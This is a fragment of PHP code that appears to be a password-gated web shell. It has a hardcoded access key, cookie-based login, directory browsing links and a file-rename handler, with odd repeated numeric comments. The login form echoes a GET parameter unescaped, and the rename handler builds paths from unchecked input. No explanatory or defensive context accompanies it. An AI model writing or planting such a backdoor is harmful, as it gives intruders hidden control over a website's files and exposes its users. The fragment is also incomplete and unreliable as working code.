...
$auth_key = "50c529a15eb191c49247e18ebe05fd3c";
...
$pass = false;
if (isset($_COOKIE['pw_name_83187'])) {
    if(($_COOKIE['pw_name_83187']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_83187'])) {
        if(($_POST['pw_name_83187']) == $auth_key) {
            setcookie("pw_name_83187", $_POST['pw_name_83187']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_83187' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724799728598172 1724799728769303 1724799728969542 1724799728294481
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724799728598172 1724799728769303 1724799728969542 1724799728294481
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724799728598172 1724799728769303 1724799728969542 1724799728294481
            $name = PATH . "/" . $_GET['r'];
